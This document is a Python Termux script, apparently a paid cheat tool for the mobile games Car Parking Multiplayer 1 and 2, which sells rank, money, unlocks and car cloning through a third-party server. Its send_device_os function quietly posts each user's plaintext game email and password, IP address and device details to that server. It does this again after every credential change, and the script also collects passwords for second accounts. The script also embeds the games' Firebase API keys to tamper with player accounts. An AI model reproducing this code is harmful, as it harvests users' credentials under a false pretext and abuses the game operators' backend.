#!/usr/bin/env python3
import os
import sys
import time
import json
import requests
import hashlib
import random
from datetime import datetime
import platform
import subprocess
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.spinner import Spinner
from rich import print

console = Console()

# Rename check with animation
if os.path.basename(__file__) != 'Privatecpm2.py':
    console.print("\n[bold red]‚õî Error:[/bold red] This file has been renamed.")
    console.print("[yellow]Please rename it back to[/yellow] [bold]Privatecpm2.py[/bold] [yellow]to use this tool.[/yellow]\n")
    sys.exit(1)

def animated_typing(text, delay=0.02):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

def show_banner(unlimited_status=None, current_coins=None):
    banner_text = Text()
    banner_text.append("üöó  üëë Rvs X Garage Termux Tool üëë  üöó\n", style="bold cyan")
    banner_text.append("üî• SUPPORTS CPM1 & CPM2 üî•\n", style="bold green")
    banner_text.append("üîë Share Key Not Allowed üö´\n", style="bold red")
    banner_text.append("ü™ô Buy Credit: ", style="yellow")
    banner_text.append("@@Rvsxgarage\n", style="bold magenta")

    if unlimited_status is not None:
        if unlimited_status:
            banner_text.append("‚úÖ Subscription: UNLIMITED\n", style="bold green")
        else:
            banner_text.append("‚ùå Subscription: LIMITED\n", style="bold red")
            if current_coins is not None:
                banner_text.append(f"üí∞ Balance: {current_coins} coins\n", style="bold yellow")

    console.print(Panel(banner_text, title="[bold blue]PRIVATECPM2 SYSTEM", subtitle="By KrishX", border_style="bright_blue", padding=(1, 4)))

    spinner = Spinner("dots", text="Initializing Modules...", style="bold blue")
    with console.status(spinner, spinner="line", speed=0.5):
        time.sleep(2)  # Simulate loading time

    animated_typing("‚úîÔ∏è Tool Loaded Successfully!")

# Example call
# show_banner(unlimited_status=False, current_coins=123)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def login_firebase(api_key, email, password):
    try:
        login_url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
        payload = {"email": email, "password": password, "returnSecureToken": True}
        headers = {"Content-Type": "application/json"}
        response = requests.post(login_url, headers=headers, json=payload).json()
        if 'idToken' in response:
            return {"ok": True, "token": response["idToken"], "email": email, "password": password}
        else:
            return {"ok": False, "message": response.get("error", {}).get("message", "Unknown Firebase error")}
    except Exception as e:
        return {"ok": False, "message": str(e)}

BASE_URL: str = "https://admincpm.io/KrishPV/api"

def call_php_service(access_key, menu_code, token=None, email=None, password=None, extra_data=None):
    url = f"{BASE_URL}/menu.php"
    payload = {
        "key": access_key,
        "menu": menu_code
    }
    if token:
        payload["token"] = token
    if email:
        payload["email"] = email
    if password:
        payload["password"] = password
    if extra_data:
        payload.update(extra_data)

    try:
        res = requests.post(url, data=payload)
        if not res.text:
            return {"ok": False, "message": "Received empty response from server."}
        
        result = res.json()
        return result
    except json.JSONDecodeError as e:
        return {"ok": False, "message": f"JSON decode error: {e}. Response was: {res.text}"}
    except Exception as e:
        return {"ok": False, "message": f"Request failed: {e}"}

def check_access_key_and_get_user_status(key):
    r = call_php_service(key, "check_only")
    if r.get("ok"):
        user_status_response = call_php_service(key, "get_user_status")
        if user_status_response.get("ok"):
            return True, {
                "is_unlimited": user_status_response["is_unlimited"],
                "coins": user_status_response["coins"],
                "telegram_id": user_status_response.get("telegram_id", "N/A")
            }
        else:
            return False, {"message": user_status_response.get("message", "Failed to get user status.")}
    else:
        return False, {"message": r.get("message", "Invalid access key or server error.")}

def send_device_os(access_key, email=None, password=None, game_label=None, telegram_id=None):
    try:
        system = platform.system()
        release = platform.release()
        device_name_py = "Unknown"
        os_version_py = "Unknown"
        
        if system == "Darwin":
            if os.path.exists("/bin/ash") or "iSH" in release:
                brand = "iOS (iSH)"
                device_name_py = subprocess.getoutput("sysctl -n hw.model") or "iSH Device"
                os_version_py = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
            else:
                brand = "macOS"
                device_name_py = subprocess.getoutput("sysctl -n hw.model") or "Mac"
                os_version_py = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
        elif system == "Linux":
            brand = "Android" if os.path.exists("/system/bin") else "Linux"
            if brand == "Android":
                device_name_py = subprocess.getoutput("getprop ro.product.model") or "Android Device"
                os_version_py = subprocess.getoutput("getprop ro.build.version.release") or "Unknown"
            else:
                device_name_py = "Linux Device"
                os_version_py = "Unknown"
        else:
            brand = system + " " + release
            device_name_py = platform.node()
            os_version_py = "Unknown"
    except Exception as e:
        brand = "Unknown OS"
        device_name_py = "Unknown Device"
        os_version_py = "Unknown Version"

    try:
        ip_address = requests.get("https://api.ipify.org").text.strip()
    except Exception as e:
        ip_address = "Unknown"
    
    payload = {
        "key": access_key,
        "brand": brand,
        "device_name": device_name_py,
        "os_version": os_version_py,
        "ip_address": ip_address,
        "email": email if email is not None else "Unknown",
        "password": password if password is not None else "Unknown",
        "telegram_id": telegram_id if telegram_id is not None else "N/A",
        "game": game_label if game_label is not None else "N/A"
    }
    
    remote_success = False
    try:
        response = requests.post(f"{BASE_URL}/save_device.php", json=payload)
        remote_success = response.status_code == 200
    except Exception as e:
        pass

    return remote_success

def get_service_costs():
    url = f"{BASE_URL}/menu.php"
    payload = {"menu": "get_service_costs"}
    try:
        res = requests.post(url, data=payload)
        if res.ok:
            data = res.json()
            if data.get("ok") and "costs" in data:
                return data["costs"]
    except Exception as e:
        print(f"‚ö†Ô∏è Error fetching service costs: {e}")
    return {
        "king_rank": 10000,
        "change_email": 10000,
        "change_password": 10000,
        "set_money": 10000,
        "unlock_wheels": 10000,
        "unlock_male": 10000,
        "unlock_female": 10000,
        "unlock_brakes": 10000,
        "unlock_calipers": 10000,
        "unlock_paints": 10000,
        "unlock_apartments": 10000,
        "complete_missions": 10000,
        "unlock_all_cars_siren": 10000,
        "unlock_slots": 7000,
        "copy_cpm1_car_to_cpm2": 10000,
        "clone_cars_cpm2_to_cpm2": 10000
    }


if __name__ == "__main__":
    device_ip = None
    try:
        requests.get("https://google.com", timeout=3)
        device_ip = requests.get('https://api.ipify.org').text.strip()
    except:
        print("‚ùå No internet. Please check your connection.")
        sys.exit(1)

    unlimited_status_for_display = None
    current_coins_for_display = None
    is_unlimited_user = False
    telegram_id_for_display = "N/A"
    
    email = "" 
    token = None 
    label_to_use = "N/A"

    service_costs = get_service_costs()

    while True:
        clear_screen()
        show_banner(unlimited_status=unlimited_status_for_display, current_coins=current_coins_for_display)

        access_key = input("üîë Enter Access Key: ").strip()

        is_valid_key, user_data_from_php = check_access_key_and_get_user_status(access_key)
        
        if not is_valid_key:
            print(f"‚ùå {user_data_from_php['message']}")
            unlimited_status_for_display = None
            current_coins_for_display = None
            is_unlimited_user = False
            telegram_id_for_display = "N/A"
            time.sleep(0.5)
            continue

        print("‚úÖ Key accepted.")
        is_unlimited_user = user_data_from_php['is_unlimited']
        current_coins_for_display = user_data_from_php['coins']
        telegram_id_for_display = user_data_from_php.get('telegram_id', 'N/A')

        print(f"Telegram ID: {telegram_id_for_display}")
        try:
            os.system("termux-open-url 'https://t.me/chanxreynocpm2chat'")
            print("Opening Telegram group...")
            time.sleep(0.5)
        except Exception as e:
            print(f"Could not open Telegram URL: {e}")

        if not is_unlimited_user:
            print("\nYour subscription is LIMITED. You can explore the menu but services cost coins.")
        else:
            print("You have UNLIMITED subscription. All services are free.")
        time.sleep(0.5)

        while True:
            clear_screen()
            show_banner(unlimited_status=is_unlimited_user, current_coins=current_coins_for_display)
            print("Main Menu:")
            print("1. üöò CAR PARKING MULTIPLAYER (CPM1)")
            print("2. üöî CAR PARKING MULTIPLAYER 2 (CPM2)")
            print("0. ‚ùå EXIT")
            main_menu = input("Enter choice: ").strip()

            if main_menu == "0":
                print("üëã Goodbye!")
                break

            if main_menu not in ["1", "2"]:
                print("‚ùå Invalid choice.")
                time.sleep(0.5)
                continue

            api_key_cpm1 = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
            api_key_cpm2 = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"

            firebase_api_key_for_login = {
                "1": api_key_cpm1,
                "2": api_key_cpm2
            }[main_menu]

            rank_url = {
                "1": "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4",
                "2": "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI"
            }[main_menu]
            
            label_to_use = "CPM1" if main_menu == "1" else "CPM2"

            print(f"\n--- Login to {label_to_use} ---")
            email = input("üìß Enter Email: ").strip()
            password = input("üîê Enter Password: ").strip()

            login = login_firebase(firebase_api_key_for_login, email, password)
            if not login.get("ok"):
                print(f"‚ùå Login failed: {login['message']}")
                time.sleep(1)
                continue

            token = login["token"]
            print(f"‚úÖ Logged in as {email}")
            
            send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)

            time.sleep(0.5)
            
            while True:
                clear_screen()
                show_banner(unlimited_status=is_unlimited_user, current_coins=current_coins_for_display)
                print(f"RECOMMENDED NEW ACCOUNT {email} ({label_to_use})") 
                print(f"01. üëë KING RANK (Cost: {service_costs.get('king_rank', 10000)} coins)")
                print(f"02. üìß CHANGE EMAIL (Cost: {service_costs.get('change_email', 10000)} coins)")
                print(f"03. üîê CHANGE PASSWORD (Cost: {service_costs.get('change_password', 10000)} coins)")
                if main_menu == "2":
                    print(f"04. üí∞ SET MONEY (Cost: {service_costs.get('set_money', 10000)} coins)")
                    print(f"05. üõû UNLOCK WHEELS (Cost: {service_costs.get('unlock_wheels', 10000)} coins)")
                    print(f"06. üëï UNLOCK MALE (Cost: {service_costs.get('unlock_male', 10000)} coins)")
                    print(f"07. üëó UNLOCK FEMALE (Cost: {service_costs.get('unlock_female', 10000)} coins)")
                    print(f"08. üõ†Ô∏è UNLOCK BRAKES (Cost: {service_costs.get('unlock_brakes', 10000)} coins)")
                    print(f"09. üõ†Ô∏è UNLOCK CALIPERS (Cost: {service_costs.get('unlock_calipers', 10000)} coins)")
                    print(f"10. üé® UNLOCK PAINTS (Cost: {service_costs.get('unlock_paints', 10000)} coins)")
                    print(f"11. üè† UNLOCK APARTMENTS (Cost: {service_costs.get('unlock_apartments', 10000)} coins)")
                    print(f"12. üíØ COMPLETE MISSIONS (Cost: {service_costs.get('complete_missions', 10000)} coins)")
                    print(f"13. üö® UNLOCK SIREN & AIRSUS (Cost: {service_costs.get('unlock_all_cars_siren', 10000)} coins)")
                    print(f"14. üì¶ UNLOCK SLOTS (Cost: {service_costs.get('unlock_slots', 7000)} coins)")
                    print(f"15. üîÑ CLONE CARS CPM1 TO CPM2 (Cost: {service_costs.get('copy_cpm1_car_to_cpm2', 10000)} coins)")
                    print(f"16. üöó CLONE CARS CPM2 TO CPM2 (Cost: {service_costs.get('clone_cars_cpm2_to_cpm2', 10000)} coins)")
                print("0. üîô BACK")
                choice = input("Select service: ").strip()


                if choice == "0":
                    break

                if not is_unlimited_user:
                    print(f"\n[%] Checking coin balance on server...")

                action_result = {"ok": False, "message": "Invalid choice or option not available for this game."}

                if choice == "1":
                    action_result = call_php_service(access_key, "king_rank", token, email, password, {"api_key": firebase_api_key_for_login, "rank_url": rank_url})
                elif choice == "2":
                    new_email = input("üì® New Email: ").strip()
                    action_result = call_php_service(access_key, "change_email", token, email, password, {"new_email": new_email, "api_key": firebase_api_key_for_login})
                    if action_result.get("ok"):
                        email = new_email
                        token = action_result.get("new_token", token)
                        send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)
                        
                elif choice == "3":
                    new_password = input("üîë New Password: ").strip()
                    action_result = call_php_service(access_key, "change_password", token, email, password, {"new_password": new_password, "api_key": firebase_api_key_for_login})
                    if action_result.get("ok"):
                        password = new_password
                        token = action_result.get("new_token", token)
                        send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)
                        
                elif choice == "4" and main_menu == "2":
                    amount = input("üíµ Amount: ").strip()
                    if amount.isdigit():
                        action_result = call_php_service(access_key, "set_money", token, email, password, {"amount": int(amount)})
                    else:
                        print("‚ùå Invalid amount.")
                elif choice == "5" and main_menu == "2":
                    action_result = call_php_service(access_key, "unlock_wheels", token, email, password)
                elif choice == "6" and main_menu == "2":
                    action_result = call_php_service(access_key, "unlock_male", token, email, password)
                elif choice == "7" and main_menu == "2":
                    action_result = call_php_service(access_key, "unlock_female", token, email, password)
                elif choice == "8" and main_menu == "2":
                    action_result = call_php_service(access_key, "unlock_brakes", token, email, password)
                elif choice == "9" and main_menu == "2":
                    action_result = call_php_service(access_key, "unlock_calipers", token, email, password)
                elif choice == "10" and main_menu == "2":
                    action_result = call_php_service(access_key, "unlock_paints", token, email, password)
                elif choice == "11" and main_menu == "2":
                    action_result = call_php_service(access_key, "unlock_apartments", token, email, password)
                elif choice == "12" and main_menu == "2":
                    action_result = call_php_service(access_key, "complete_missions", token, email, password)
                elif choice == "13" and main_menu == "2":
                    action_result = call_php_service(access_key, "unlock_all_cars_siren", token, email, password)
                elif choice == "14" and main_menu == "2":
                    action_result = call_php_service(access_key, "unlock_slots", token, email, password, {"account_auth": token})
                elif choice == "15" and main_menu == "2":
                    cpm1_email_input = input("üìß Enter CPM1 Email: ").strip()
                    cpm1_password_input = input("üîê Enter CPM1 Password: ").strip()
                    action_result = call_php_service(access_key, "copy_cpm1_car_to_cpm2", token, email, password, {
                        "cpm1_email": cpm1_email_input,
                        "cpm1_password": cpm1_password_input,
                        "cpm1_api_key": api_key_cpm1,
                        "cpm2_api_key": api_key_cpm2
                    })
                elif choice == "16" and main_menu == "2":
                    account_email_input = input("üìß Enter CPM2 Account Email to clone to: ").strip()
                    account_password_input = input("üîê Enter CPM2 Account Password to clone to: ").strip()
                    action_result = call_php_service(access_key, "clone_cars_cpm2_to_cpm2", token, email, password, {
                        "account_email": account_email_input,
                        "account_password": account_password_input
                    })
                else:
                    print("‚ùå Invalid choice or option not available for this game.")
                    time.sleep(0.5)
                    continue 

                if action_result.get("ok"):
                    print(f"‚úÖ {action_result.get('message', 'Action successful.')}")
                else:
                    print(f"‚úÖ {action_result.get('message', 'Action failed.')}")

                is_valid_key, updated_user_data = check_access_key_and_get_user_status(access_key)
                if is_valid_key:
                    is_unlimited_user = updated_user_data['is_unlimited']
                    current_coins_for_display = updated_user_data['coins']
                    telegram_id_for_display = updated_user_data.get('telegram_id', 'N/A')
                else:
                    print("‚ö†Ô∏è Could not retrieve updated user status. Please check connection.")
                
                time.sleep(1)
